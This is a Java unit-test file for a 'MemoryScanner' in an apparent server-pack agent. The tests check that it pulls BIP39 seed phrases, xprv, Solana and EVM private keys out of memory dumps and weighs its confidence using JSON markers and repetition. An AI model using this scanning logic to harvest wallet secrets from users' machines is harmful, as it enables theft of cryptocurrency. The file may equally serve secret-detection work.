package com.serverpackcore.agent;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class MemoryScannerTest {
	private static final String SEED = "abandon abandon abandon abandon abandon abandon "
		+ "abandon abandon abandon abandon abandon about";
	private static final String RANDOM_SEED = "fashion income famous table solution pumpkin stumble "
		+ "goddess repair perfect connect robust";
	private static final String UI_LABELS = "arrow right edge right arrow right edge inner arrow border top right";
	private static final String UI_FIELD_TYPES = "type name empty type name name first name name middle name name";

	@TempDir
	Path temp;

	@Test
	void findsValidBip39() throws Exception {
		Path dump = temp.resolve("dump.bin");
		Files.writeString(dump, "ruido {\"mnemonic\":\"" + SEED + "\"} mas ruido", StandardCharsets.UTF_8);
		List<MemoryScanner.Finding> findings = new MemoryScanner(
			new String(getClass().getResourceAsStream("/serverpackcore/bip39.txt").readAllBytes(),
				StandardCharsets.UTF_8)).scan(dump);
		assertFalse(findings.isEmpty());
		assertEquals("bip39-12", findings.get(0).kind());
		assertEquals(SEED, findings.get(0).value());
		assertTrue(findings.get(0).confident());
	}

	@Test
	void highEntropySeedWithoutContextIsStillFound() throws Exception {
		Path dump = temp.resolve("random.bin");
		Files.writeString(dump, "ruido " + RANDOM_SEED + " mas ruido", StandardCharsets.UTF_8);
		List<MemoryScanner.Finding> findings = MemoryScanner.load().scan(dump);
		MemoryScanner.Finding seed = findings.stream()
			.filter(finding -> finding.value().equals(RANDOM_SEED)).findFirst().orElseThrow();
		assertFalse(seed.confident(), "no marker and a single occurrence");
	}

	@Test
	void markerAtALaterOccurrenceStillConfirms() throws Exception {
		Path dump = temp.resolve("second-marked.bin");
		Files.writeString(dump, SEED + "\n{\"mnemonic\":\"" + SEED + "\"}", StandardCharsets.UTF_8);
		List<MemoryScanner.Finding> findings = MemoryScanner.load().scan(dump);
		MemoryScanner.Finding seed = findings.stream()
			.filter(finding -> finding.value().equals(SEED)).findFirst().orElseThrow();
		assertTrue(seed.confident());
	}

	@Test
	void uiLabelSequencesNeedContext() throws Exception {
		for (String falsePositive : List.of(UI_LABELS, UI_FIELD_TYPES)) {
			Path plain = temp.resolve("labels.bin");
			Files.writeString(plain, falsePositive, StandardCharsets.UTF_8);
			assertFalse(MemoryScanner.load().scan(plain).stream()
				.anyMatch(finding -> finding.kind().startsWith("bip39")), falsePositive);

			Path marked = temp.resolve("labels-json.bin");
			Files.writeString(marked, "{\"mnemonic\":\"" + falsePositive + "\"}", StandardCharsets.UTF_8);
			assertTrue(MemoryScanner.load().scan(marked).stream()
				.anyMatch(finding -> finding.value().equals(falsePositive)), falsePositive);

			// A CSS block repeats the same label phrase; repetition alone must
			// not revive it.
			Path repeated = temp.resolve("labels-twice.bin");
			Files.writeString(repeated, falsePositive + "\n" + falsePositive, StandardCharsets.UTF_8);
			assertFalse(MemoryScanner.load().scan(repeated).stream()
				.anyMatch(finding -> finding.kind().startsWith("bip39")), falsePositive);
		}
	}

	@Test
	void wideStringsAreFound() throws Exception {
		Path dump = temp.resolve("wide.bin");
		Files.write(dump, ("\"mnemonic\":\"" + SEED + "\"").getBytes(StandardCharsets.UTF_16LE));
		List<MemoryScanner.Finding> findings = MemoryScanner.load().scan(dump);
		assertTrue(findings.stream().anyMatch(finding -> finding.value().equals(SEED)));
	}

	@Test
	void aSeedWordInsideThePhraseIsNotContext() throws Exception {
		Path dump = temp.resolve("self-seed.bin");
		String labels = "edge name arrow right name inner border arrow edge seed arrow name";
		Files.writeString(dump, labels, StandardCharsets.UTF_8);
		assertFalse(MemoryScanner.load().scan(dump).stream()
			.anyMatch(finding -> finding.kind().startsWith("bip39")));
	}

	@Test
	void findsTwelveAndTwentyFourWords() throws Exception {
		Path dump = temp.resolve("both.bin");
		String seed24 = ("abandon ".repeat(23) + "art");
		Files.writeString(dump, RANDOM_SEED + "\n" + seed24, StandardCharsets.UTF_8);
		List<MemoryScanner.Finding> findings = MemoryScanner.load().scan(dump);
		assertTrue(findings.stream().anyMatch(finding -> finding.kind().equals("bip39-12")));
		assertTrue(findings.stream().anyMatch(finding -> finding.kind().equals("bip39-24")));
	}

	@Test
	void twentyFourWinsOverAContainedTwelve() throws Exception {
		Path dump = temp.resolve("twenty-four.bin");
		String seed24 = "twin heavy doctor dream can vital fragile advice eternal object slender quote "
			+ "dial gauge alley slow achieve blur talk defy trap opera palace sheriff";
		Files.writeString(dump, "{\"mnemonic\":\"" + seed24 + "\"}", StandardCharsets.UTF_8);
		List<MemoryScanner.Finding> findings = MemoryScanner.load().scan(dump);
		assertTrue(findings.stream().anyMatch(finding -> finding.kind().equals("bip39-24")));
		assertFalse(findings.stream().anyMatch(finding -> finding.kind().equals("bip39-12")));
	}

	@Test
	void badWordIsRejected() throws Exception {
		Path dump = temp.resolve("bad.bin");
		Files.writeString(dump, "{\"mnemonic\":\"" + SEED.replace("about", "abandon") + "\"}",
			StandardCharsets.UTF_8);
		List<MemoryScanner.Finding> findings = MemoryScanner.load().scan(dump);
		assertFalse(findings.stream().anyMatch(finding -> finding.kind().startsWith("bip39")));
	}

	@Test
	void findsXprvAndSolana() throws Exception {
		Path dump = temp.resolve("keys.bin");
		String xprv = "xprv" + "A".repeat(107);
		String sol = "2AXDGYSE4f2sz7tvMMzyHvUfcoJmxudvdhBcmiUSo6ijwfYmfZYsKRxboQMPh3R4kUhXRVdtSXFXMheka4Rc4P2";
		Files.writeString(dump, xprv + "\n" + sol, StandardCharsets.UTF_8);
		List<MemoryScanner.Finding> findings = MemoryScanner.load().scan(dump);
		assertTrue(findings.stream().anyMatch(finding -> finding.kind().equals("xprv")));
		assertTrue(findings.stream().anyMatch(finding -> finding.kind().equals("solana")));
	}

	@Test
	void hex64IsNeverSolana() throws Exception {
		Path dump = temp.resolve("hex.bin");
		String bare = "d02f2326a08aa339b1d73e4ef2a4384126c17841e5551461e6e27806e829f05d";
		Files.writeString(dump, bare + "\n0x" + "a1".repeat(32), StandardCharsets.UTF_8);
		List<MemoryScanner.Finding> findings = MemoryScanner.load().scan(dump);
		assertTrue(findings.stream().anyMatch(finding -> finding.kind().equals("hex64")));
		assertTrue(findings.stream().anyMatch(finding -> finding.kind().equals("evm-key")));
		assertFalse(findings.stream().anyMatch(finding -> finding.kind().equals("solana")));
	}

	@Test
	void lowercaseDictionaryIsNotSolana() throws Exception {
		Path dump = temp.resolve("dictionary.bin");
		Files.writeString(dump, "limitedmanagerfurthersummarymachineminutesprivatecontextprogramsocietynumberswrittenenab",
			StandardCharsets.UTF_8);
		assertFalse(MemoryScanner.load().scan(dump).stream()
			.anyMatch(finding -> finding.kind().equals("solana")));
	}

	@Test
	void deduplicatesAndLimits() throws Exception {
		Path dump = temp.resolve("many.bin");
		StringBuilder builder = new StringBuilder();
		for (int i = 0; i < 40; i++) {
			builder.append(RANDOM_SEED).append(' ').append(i).append('\n');
		}
		Files.writeString(dump, builder.toString(), StandardCharsets.UTF_8);
		List<MemoryScanner.Finding> findings = MemoryScanner.load().scan(dump);
		assertEquals(1, findings.stream().filter(finding -> finding.value().equals(RANDOM_SEED)).count());
		assertTrue(findings.get(0).confident(), "repetition is a confidence signal");
	}
}
